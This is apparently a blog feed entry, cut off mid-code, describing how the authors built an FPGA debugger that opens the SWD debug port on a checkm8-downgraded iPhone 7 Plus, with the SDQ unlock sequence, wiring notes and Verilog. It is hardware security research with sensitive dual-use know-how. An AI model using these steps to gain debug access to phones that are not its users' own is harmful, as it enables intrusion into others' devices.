<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-09-05T21:01:11+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">极目楚天舒</title><subtitle>专注于系统底层安全，主要研究 Linux 内核漏洞挖掘与利用、iPhone 硬件安全、Intel 处理器安全， 致力于探索复杂系统背后的安全风险</subtitle><entry><title type="html">iPhone SWD 调试器的开发</title><link href="http://localhost:4000/hardware/2025/08/30/iphone-SWD-%E8%B0%83%E8%AF%95%E5%99%A8.html" rel="alternate" type="text/html" title="iPhone SWD 调试器的开发" /><published>2025-08-30T13:27:38+08:00</published><updated>2025-08-30T13:27:38+08:00</updated><id>http://localhost:4000/hardware/2025/08/30/iphone-SWD-%E8%B0%83%E8%AF%95%E5%99%A8</id><content type="html" xml:base="http://localhost:4000/hardware/2025/08/30/iphone-SWD-%E8%B0%83%E8%AF%95%E5%99%A8.html"><![CDATA[<p>PANDA 2025 安全大会上，我们在 iPhone 7 plus 上面成功启动 Linux 内核，我们继续探索苹果手机硬件安全，并于近日成功打开了  iPhone 7 plus 的 SWD 硬件调试端口。</p>

<h1 id="lighting-接口原理">lighting 接口原理</h1>

<p><a href="https://nyansatan.github.io/lightning/">Apple Lightning</a></p>

<p><a href="https://www.youtube.com/watch?v=8p3Oi4DL0eI">DEF CON 30 - stacksmashing  - The Hitchhacker’s Guide to iPhone Lightning and JTAG Hacking</a></p>

<h2 id="lighting-接口历史">lighting 接口历史</h2>

<p>苹果的 Lightning 接口从 <strong>2012年</strong> 的 iPhone 5 开始启用，直到 <strong>2023年</strong> 的 iPhone 14 系列和 iPhone SE（第3代）为止，之后的机型就全面转向 USB-C 了。</p>

<table>
  <thead>
    <tr>
      <th><strong>手机系列</strong></th>
      <th><strong>具体型号</strong></th>
      <th><strong>发布时间</strong></th>
      <th><strong>状态</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>iPhone SE</strong></td>
      <td>第1代、第2代、第3代</td>
      <td>2016-2022</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 5</strong></td>
      <td>iPhone 5、iPhone 5c、iPhone 5s</td>
      <td>2012-2013</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 6</strong></td>
      <td>iPhone 6、iPhone 6 Plus</td>
      <td>2014</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 7</strong></td>
      <td>iPhone 7、iPhone 7 Plus</td>
      <td>2016</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 8</strong></td>
      <td>iPhone 8、iPhone 8 Plus</td>
      <td>2017</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone X</strong></td>
      <td>iPhone X</td>
      <td>2017</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone XS</strong></td>
      <td>iPhone XS、iPhone XS Max</td>
      <td>2018</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone XR</strong></td>
      <td>iPhone XR</td>
      <td>2018</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 11</strong></td>
      <td>iPhone 11、iPhone 11 Pro、iPhone 11 Pro Max</td>
      <td>2019</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 12</strong></td>
      <td>iPhone 12、iPhone 12 mini、iPhone 12 Pro、iPhone 12 Pro Max</td>
      <td>2020</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 13</strong></td>
      <td>iPhone 13、iPhone 13 mini、iPhone 13 Pro、iPhone 13 Pro Max</td>
      <td>2021</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 14</strong></td>
      <td>iPhone 14、iPhone 14 Plus、iPhone 14 Pro、iPhone 14 Pro Max</td>
      <td>2022</td>
      <td>已停产停售</td>
    </tr>
  </tbody>
</table>

<h2 id="lighting-接口实物图">lighting 接口实物图</h2>

<h3 id="lighting-母座">lighting 母座</h3>

<p>母座一般情况下就是我们手机上面的充电口，实际使用8个引脚：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/image.png" alt="image.png" /></p>

<ul>
  <li>ID0 和 ID1 是功能选择信号线。当公头插入的时候，公头内置的协议芯片通过这两个引脚与设备通信，告知设备选通“USB通信、串口通信、SWD通信、充电”四者之一的功能。</li>
  <li>L0p L0n 和 L1p L1n 是两对差分线，在USB通信功能被选通的情况下，用于传输 USB 数据。</li>
  <li>PWR 引脚用于充电，或者对外提供电源。</li>
</ul>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/lightning_port_pinout.jpg" alt="lightning_port_pinout.jpg" /></p>

<h3 id="lighting-公头">lighting 公头</h3>

<p>公头是双面结构，每个面都有8个触点。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/c9153d2417884c2388d32a539ca7310e.webp" alt="c9153d2417884c2388d32a539ca7310e.webp" /></p>

<p>这个是双面夹层的电气结构，其中 ACC_ID 和 ACC_PWR 分别对应于母座的 ID0 和 ID1 引脚。</p>

<p>可以看到正反两面除了 ACC_ID 、 ACC_PWR两个触点，其他触点都是左右镜像的，这可以保证无论公头的插入方向是什么，供电引脚和数据引脚都能与母座对应。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/%E5%85%AC%E5%8F%A3%E7%94%B5%E6%B0%94%E7%BB%93%E6%9E%84.jpg" alt="公口电气结构.jpg" /></p>

<h2 id="lighting-接口电路">lighting 接口电路</h2>

<p>lighting 接口电路的核心功能是有一个多路复用器，一端与母座连接，另一端与 SoC 芯片管脚相连。</p>

<p>公头插入母座的时候，公头内部的通信芯片从母座的 PWR 和 GND 引脚获取电源，通过 ID0 和 ID1 与多路复用器通信，通信协议是德州仪器未公开的 SDQ 协议。</p>

<p>通信过程的内容包括功能选通、状态读取、接口配置。</p>

<p>通常情况下用户接触到最多的是 USB 通信和充电这两个功能，</p>

<p>SWD 调试端口功能需要利用 <a href="https://www.notion.so/checkm8-1a03f4b7819d80a099bad5da127b8372?pvs=21">checkm8</a> 漏洞降级设备之后，再向设备发送特定的 SDQ 序列才能选通，这是本文讨论的主要内容之一。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.jpg" alt="未命名绘图.jpg" /></p>

<h1 id="sdq-协议原理">SDQ 协议原理</h1>

<p>SDQ 协议最早是德州仪器公司为苹果设备开发的单线（1-wire）通信协议，该协议至今未开源。</p>

<p>SDQ 通信只需要一根线就能完成，连接主从设备。通常情况下 iPhone 作为主设备，与之相连的数据线作为从设备。</p>

<p>母座检测到公头插入的时候，会在 ID0 和 ID1 两个引脚交替发起轮询，等待应答。</p>

<p>公头通过 ID0 或者 ID1 两者之一的引脚与设备通信。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/image%201.png" alt="image.png" /></p>

<h2 id="例子usb-数据通信过程">例子：USB 数据通信过程</h2>

<p>下图是逻辑分析仪抓取到的 USB 通信过程，截取了最开始 SDQ 通信部分。</p>

<p>“74 00 02 1f” 序列由设备的 lighting 接口电路发起，等待外部应答。</p>

<p>插入 lighting 数据线之后，数据线响应 “75 10 09 08 00 00 00 a8” 序列，表示选通 USB 通信功能。</p>

<p>lighting 接口电路切换电路功能到 USB 数据传输。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8.jpg" alt="iPhone SWD调试器.jpg" /></p>

<h2 id="数据格式">数据格式</h2>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F.jpg" alt="iPhone SWD调试器-数据格式.jpg" /></p>

<p>CRC 计算参数如下：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/D9B360FB-0E77-4008-B9C2-6DA9AF3FB0CF.png" alt="{D9B360FB-0E77-4008-B9C2-6DA9AF3FB0CF}.png" /></p>

<h2 id="比特位的表示">比特位的表示</h2>

<p>单字节中间，比特 0 的周期为 10 微秒，其中低电平占 7 微秒；</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/047CA35B-D51C-4A5B-93DB-6BE63B0F77C1.png" alt="{047CA35B-D51C-4A5B-93DB-6BE63B0F77C1}.png" /></p>

<p>单字节第 7 位，比特 0 的周期为 27.5 微秒，其中低电平占 7 微秒；</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/F14469CC-A9C6-4086-B505-E342B1D73475.png" alt="{F14469CC-A9C6-4086-B505-E342B1D73475}.png" /></p>

<p>单字节中间，比特 1 的周期为 10 微秒，其中低电平占 2 微秒；</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/FC8A4901-1F2C-41CA-AA35-8126F326F0F6.png" alt="{FC8A4901-1F2C-41CA-AA35-8126F326F0F6}.png" /></p>

<p>单字节第 7 位，比特 1 的周期为 27.5 微秒，其中低电平占 2 微秒；</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/5E821473-7509-47DE-B181-4510805D5C55.png" alt="{5E821473-7509-47DE-B181-4510805D5C55}.png" /></p>

<h2 id="引脚状态切换">引脚状态切换</h2>

<ol>
  <li>iphone 占用信号线，数据线高阻态；</li>
  <li>方向切换，耗时大约 120 微秒；</li>
  <li>数据线占用信号线，lighting 电路高阻态。</li>
</ol>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-usb%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B.jpg" alt="iPhone SWD调试器-usb通信过程.jpg" /></p>

<h2 id="lighting-数据线解剖">lighting 数据线解剖</h2>

<p>市售的 lighting 数据线分为 2 类：一类内嵌协议芯片，另一类不带协议芯片。</p>

<p>淘宝平台上若不特殊说明，搜到的都是第一类数据线。</p>

<p>解剖可以看到里面包含了一颗电源芯片和一颗协议芯片。这类数据线插入手机后，会通过母座的 PWR 和 GND 引脚拉取电源，使用 ID0 或者 ID1 引脚与手机的 lighting 接口电路进行 SDQ 通信，根据用户选择的“仅充电”或者“文件传输”选项，选通 USB 功能或者充电功能。</p>

<p>我们只能控制 PWR 、GND 、D+ 、D-  四个引脚。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/lighting%E8%A7%A3%E5%89%96.jpg" alt="lighting解剖.jpg" /></p>

<p>这类数据线显然不能满足我们的需求，我们需要 8 个引脚都能够被我们控制。淘宝搜索 “lighting 扩展线 ”：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_5_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 5 页.jpg" /></p>

<h2 id="sdq-协议破解途径">SDQ 协议破解途径</h2>

<h3 id="途径一早期芯片数据手册">途径一：早期芯片数据手册</h3>

<p>德州仪器早年的产品有数据手册流传到网上，有部分功能与现在的产品重合。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_7_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 7 页.jpg" /></p>

<h3 id="途径二富士康工程线抓包">途径二：富士康工程线抓包</h3>

<p>富士康工厂内部的调试线和专用软件经过一些渠道流入二手市场，极客们使用逻辑分析仪嗅探发现了打开 SWD 调试端口的序列码。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_8_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 8 页.jpg" /></p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/659BC51B-4FA8-4FA2-AADB-E0753D4C4B11.png" alt="{659BC51B-4FA8-4FA2-AADB-E0753D4C4B11}.png" /></p>

<h1 id="山寨调试器现状">“山寨”调试器现状</h1>

<p>拿到了开启 SWD 调试端口的 “金钥匙”之后，国外有极客团队开发出了专用调试器，比较著名的有：</p>

<p>Bonobo Cable （固件加密、不开源）</p>

<p>Kanzi Cable （不开源）</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/image%202.png" alt="image.png" /></p>

<p>这类调试器普遍比较昂贵，其中 Bonobo Cable 卖到了 749 欧元，折合人民币 6275 元，而且目前是售罄状态。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/EDE796FA-9EBD-470F-9DCE-567653DA11AD.png" alt="{EDE796FA-9EBD-470F-9DCE-567653DA11AD}.png" /></p>

<p>咸鱼上的 Kanzi Cable 卖到了 1110 元人民币以上，不包好坏，不包售后，懂的来……</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_9_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 9 页.jpg" /></p>

<h1 id="fpga实现方案">FPGA实现方案</h1>

<p>我们无需知晓 SDQ 协议每个字段的意义，只需要按照如下步骤就能打开 SWD 调试端口：</p>

<ol>
  <li>调试的目标设备是受 <a href="https://www.notion.so/checkm8-1a03f4b7819d80a099bad5da127b8372?pvs=21">checkm8</a> 漏洞影响的 iPhone 设备，这里我们用的是 iPhone 7 plus，处理器型号是 A10 fusion；</li>
  <li>使用 <a href="https://github.com/axi0mX/ipwndfu">ipwndfu</a> 工具对手机进行降级，使能 SWD 调试功能；</li>
  <li>iphone 发起轮询序列 “74 00 02 1F” ；</li>
  <li>外部响应 “75 A0 00 00 00 00 00 40” 序列，这样 lighting 接口就会切换成 SWD 调试口，其中 ID0 引脚对应 SWDIO， ID1 引脚对应 SWCLK；</li>
</ol>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_10_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 10 页.jpg" /></p>

<p>通过实际抓包测量得到 SDQ 信号的参考电压是 3.3伏</p>

<h2 id="物料清单">物料清单</h2>

<ul>
  <li>赛灵思 xc7a100t FPGA 开发板；</li>
</ul>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/1bf2d0fd6722dcafda05910ac8322b45e4d3b4f2.png1192w.webp" alt="1bf2d0fd6722dcafda05910ac8322b45e4d3b4f2.png@1192w.webp" /></p>

<ul>
  <li>iPhone 7 plus 手机；</li>
  <li>Jlink 调试器；</li>
</ul>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/204d5d3466926f69a3dfde4680533355.jpg" alt="204d5d3466926f69a3dfde4680533355.jpg" /></p>

<ul>
  <li>逻辑分析仪；</li>
</ul>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_2025-08-25_204019_775(1).jpg" alt="微信图片_2025-08-25_204019_775(1).jpg" /></p>

<ul>
  <li>自制 lighting 接口转接板</li>
</ul>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_11_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 11 页.jpg" /></p>

<h2 id="器件连接">器件连接</h2>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_12_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 12 页.jpg" /></p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/e01e492c7dbe195da9e4ad6faeed674d.jpg" alt="e01e492c7dbe195da9e4ad6faeed674d.jpg" /></p>

<p>上图的各部分作用如下：</p>

<ul>
  <li>FPGA 检测到 ID0 引脚发出轮询序列，通过 Y16 引脚响应 “75 A0 00 00 00 00 00 40” 序列，选通 lighting 接口电路的 SWD 调试功能；</li>
  <li>FPGA 通过 Y13 引脚提供 20k 电阻下拉，Y16 引脚响应 “75 A0 00 00 00 00 00 40” 序列之后立即切换为 20k 电阻上拉；</li>
  <li>jlink 调试器通过并联的方式接入电路，在 Y16 引脚切换为上拉之后，提供时钟和调试信号。</li>
</ul>

<p>要注意的是，根据 ADIv6.0 <em>**</em>规范 page B4-130 的要求，SWDIO 引脚空闲状态下需要上拉以确保引脚处于确定的电平，防止电磁干扰。在实际中，若不上拉，在逻辑分析仪中会观察到很多毛刺，直接导致jlink 调试器无法正确采样。</p>

<p>根据工程实践，SWCLK 引脚在空闲时应该下拉，防止时钟毛刺。</p>

<p>lighting 接口电路并未对 SWDIO 和 SWCLK 引脚进行上下拉，所以在选通 SWD 调试功能后，需要从外部对 SWDIO 和 SWCLK 进行上下拉，否则 jlink 无法正确采集电平。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_13_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 13 页.jpg" /></p>

<p>经过反复实验确定 ID0 20k 下拉、ID1 20k 上拉，这样既能排除信号线毛刺，又能确保 jlink 调试器有足够的驱动能力。</p>

<p>需要注意的是，SWCLK、SWDIO、GND 三根线需要绞在一起，实际测量发现这样做可以消除很大一部分毛刺，提高 jlink 调试器的采样成功率。</p>

<h2 id="工作原理">工作原理</h2>

<h3 id="开启-swd-调试端口">开启 SWD 调试端口</h3>

<p>信号时序图如下：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_14_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 14 页.jpg" /></p>

<p>FPGA 判断轮询序列的规则是，检测到 2 次 break 信号就判断中间发生了一次轮询：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_15_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 15 页.jpg" /></p>

<p>break 的检测规则是，信号下降沿触发后，低电平持续 13.9 us 即判定产生了一次 break 信号。</p>

<p>实际采样发现，break 信号低电平持续时间在 13.5 ~ 15 us 之间。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/F2564C13-71E4-4638-AD13-CBAB66B799C2.png" alt="{F2564C13-71E4-4638-AD13-CBAB66B799C2}.png" /></p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// acc引脚采样 </span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
        <span class="n">break_d0</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
        <span class="n">break_d1</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
    <span class="k">end</span>
    <span class="k">else</span> <span class="k">begin</span>
        <span class="n">break_d0</span> <span class="o">&lt;=</span> <span class="n">acc_pin</span><span class="p">;</span>                <span class="c1">// 对acc_pin引脚的信号打2拍采样</span>
        <span class="n">break_d1</span> <span class="o">&lt;=</span> <span class="n">break_d0</span><span class="p">;</span>               <span class="c1">// 采到下降沿开始计数，采到上升沿停止计数</span>
    <span class="k">end</span>
<span class="k">end</span>

<span class="c1">// 检测到下降沿，break计数器使能</span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span>
        <span class="n">break_cnt_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">acc_down</span> <span class="o">&amp;&amp;</span> <span class="n">delay_cnt</span> <span class="o">==</span> <span class="n">DELAY_CNT_MAX</span><span class="p">)</span> <span class="c1">// acc下降沿使能计数器</span>
        <span class="n">break_cnt_en</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">acc_up</span><span class="p">)</span>                         <span class="c1">// acc上升沿关闭计数器</span>
        <span class="n">break_cnt_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">break_cnt_en</span> <span class="o">&lt;=</span> <span class="n">break_cnt_en</span><span class="p">;</span>       <span class="c1">// 状态位保持</span>
<span class="k">end</span>

<span class="c1">// break计数器更新</span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
        <span class="n">break_cnt</span> <span class="o">&lt;=</span> <span class="mb">10'b0</span><span class="p">;</span>
    <span class="k">end</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">break_cnt_en</span> <span class="o">&amp;&amp;</span> <span class="n">break_cnt</span> <span class="o">&lt;</span> <span class="n">BREAK_CNT_MAX</span><span class="p">)</span>  <span class="c1">// 如果检测到下降沿，开始计数</span>
        <span class="n">break_cnt</span> <span class="o">&lt;=</span> <span class="n">break_cnt</span> <span class="o">+</span> <span class="mb">1'b1</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">break_cnt_en</span> <span class="o">&amp;&amp;</span> <span class="n">break_cnt</span> <span class="o">==</span> <span class="n">BREAK_CNT_MAX</span><span class="p">)</span> <span class="c1">// 如果低电平达到15us，清零计数器</span>
        <span class="n">break_cnt</span> <span class="o">&lt;=</span> <span class="mb">10'b0</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">break_cnt</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
<span class="k">end</span>

<span class="c1">// 发送使能置位</span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span>
        <span class="n">break_ok</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="k">break</span> <span class="o">==</span> <span class="mi">2'd2</span><span class="p">)</span>
        <span class="n">break_ok</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">break_ok</span> <span class="o">&lt;=</span> <span class="n">break_ok</span><span class="p">;</span>
<span class="k">end</span>

<span class="k">parameter</span>   <span class="n">SYS_CLK_PERIOD</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>           <span class="c1">// 系统时钟周期，20ns</span>
<span class="k">parameter</span>   <span class="n">BREAK_AVERAGE_PERIOD</span> <span class="o">=</span> <span class="mi">13500</span><span class="p">;</span>  <span class="c1">// break标志位平均时间占据13.5us</span>
<span class="k">parameter</span>   <span class="n">BREAK_MAX_PERIOD</span> <span class="o">=</span> <span class="mi">15000</span><span class="p">;</span> <span class="c1">// break标志位最大时间，如果超过15ms那么判定不是break</span>
<span class="k">parameter</span>   <span class="n">BREAK_CNT_AVERAGE</span> <span class="o">=</span> <span class="n">BREAK_AVERAGE_PERIOD</span> <span class="o">/</span> <span class="n">SYS_CLK_PERIOD</span><span class="p">;</span>
<span class="k">parameter</span>   <span class="n">BREAK_CNT_MAX</span> <span class="o">=</span> <span class="n">BREAK_MAX_PERIOD</span> <span class="o">/</span> <span class="n">SYS_CLK_PERIOD</span><span class="p">;</span>
<span class="c1">// 判断是否检测到break标志位</span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span>
        <span class="k">break</span> <span class="o">&lt;=</span> <span class="mb">2'b0</span><span class="p">;</span>         <span class="c1">// 低电平持续时间在13.5us ~ 15us之间视为break</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">acc_up</span> <span class="o">&amp;&amp;</span> <span class="n">break_cnt</span> <span class="o">&gt;=</span> <span class="n">BREAK_CNT_AVERAGE</span> <span class="o">&amp;&amp;</span> <span class="n">break_cnt</span> <span class="o">&lt;</span> <span class="n">BREAK_CNT_MAX</span><span class="p">)</span> 
        <span class="k">break</span> <span class="o">&lt;=</span> <span class="k">break</span> <span class="o">+</span> <span class="mb">1'b1</span><span class="p">;</span> <span class="c1">// break信号计数器递增，在第二个break标志位触发发送swd序列的行为</span>
    <span class="k">else</span>
        <span class="k">break</span> <span class="o">&lt;=</span> <span class="k">break</span><span class="p">;</span>
<span class="k">end</span>

<span class="c1">// 第二次break之后，延迟19us使能发送，这段时间acc引脚会保持高电平</span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span>
        <span class="n">pre_send_cnt</span> <span class="o">&lt;=</span> <span class="mb">10'b0</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">break_ok</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="n">pre_send_cnt</span> <span class="o">&lt;</span> <span class="n">AFTER_BREAK_BEFORE_SEND_CNT_MAX</span><span class="p">)</span>
            <span class="n">pre_send_cnt</span> <span class="o">&lt;=</span> <span class="n">pre_send_cnt</span> <span class="o">+</span> <span class="mb">1'b1</span><span class="p">;</span>
        <span class="k">else</span>
            <span class="n">pre_send_cnt</span> <span class="o">&lt;=</span> <span class="n">AFTER_BREAK_BEFORE_SEND_CNT_MAX</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">pre_send_cnt</span> <span class="o">&lt;=</span> <span class="mb">10'b0</span><span class="p">;</span> 
<span class="k">end</span>

</code></pre></div></div>

<p>若检测到两次 break 信号，则 break_ok 标志位置位，那么 acc 引脚切换到 acc_pin_wire ，</p>

<p>acc_pin_wire 是连接到发送 “75 A0 00 00 00 00 00 40” 序列模块的 wire 类型变量，</p>

<p>“75 A0 00 00 00 00 00 40” 序列发送完毕后，send_done 标志位置位，acc 切换到高阻态并上拉。</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// acc引脚功能切换，若发送使能置位，acc_pin和acc_wire相连接，发送序列</span>
<span class="c1">// 否则处于高阻态，20k上拉</span>
<span class="k">assign</span> <span class="n">acc_pin</span> <span class="o">=</span> <span class="p">(</span><span class="n">break_ok</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">send_done</span><span class="p">)</span> <span class="o">?</span> <span class="n">acc_pin_wire</span> <span class="o">:</span> <span class="mb">1'bz</span><span class="p">;</span>
<span class="k">assign</span> <span class="n">swclk</span> <span class="o">=</span> <span class="mb">1'bz</span><span class="p">;</span>   <span class="c1">// swclk引脚保持高阻态，20k下拉</span>

<span class="c1">// 引脚约束文件</span>
<span class="c1">//----------------------------设置ACC引脚3.3v电平--------------------------------</span>
<span class="n">set_property</span> <span class="o">-</span><span class="n">dict</span> <span class="o">{</span><span class="n">PACKAGE_PIN</span> <span class="n">Y16</span> <span class="n">IOSTANDARD</span> <span class="n">LVCMOS33</span><span class="o">}</span> <span class="p">[</span><span class="n">get_ports</span> <span class="n">acc_pin</span><span class="p">]</span>
<span class="c1">//---------------------------------设置ACC引脚上拉，上拉电阻20K-------------------</span>
<span class="n">set_property</span> <span class="n">PULLUP</span> <span class="n">TRUE</span> <span class="p">[</span><span class="n">get_ports</span> <span class="o">{</span><span class="n">acc_pin</span><span class="o">}</span><span class="p">]</span>          
<span class="n">set_property</span> <span class="n">PULLUP_RESISTOR</span> <span class="mi">20</span><span class="n">K</span> <span class="p">[</span><span class="n">get_ports</span> <span class="o">{</span><span class="n">acc_pin</span><span class="o">}</span><span class="p">]</span>
<span class="c1">//-----------------------------设置SWCLK引脚3.3v电平-----------------------------</span>
<span class="n">set_property</span> <span class="o">-</span><span class="n">dict</span> <span class="o">{</span><span class="n">PACKAGE_PIN</span> <span class="n">Y13</span> <span class="n">IOSTANDARD</span> <span class="n">LVCMOS33</span><span class="o">}</span> <span class="p">[</span><span class="n">get_ports</span> <span class="n">swclk</span><span class="p">]</span>
<span class="c1">//-----------------------------设置SWCLK引脚下拉，下拉电阻20K-------------------</span>
